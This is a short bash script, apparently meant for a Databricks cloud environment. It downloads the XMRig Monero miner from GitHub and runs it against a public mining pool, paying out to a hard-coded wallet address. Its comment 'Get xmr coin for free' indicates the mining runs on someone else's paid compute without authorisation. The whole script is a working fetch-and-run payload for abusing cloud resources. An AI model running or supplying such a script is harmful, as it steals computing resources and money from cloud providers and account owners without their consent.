#! /bin/bash
# Get xmr coin for free
# Databricks
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-focal-x64.tar.gz
tar xvzf xmrig-6.16.4-focal-x64.tar.gz
cd xmrig-6.16.4
./xmrig -o us-west.minexmr.com:443 -u 87hqkKiJWjdZMLTX3b2K2bKHjPv3nr88YbMvAQTJ9Tn7464gtsKY1Dk7ZCHpN2dUmCNwkXwqioHZyaDQ9MZcVQDzFihfLhN -k --tls --rig-id Konya
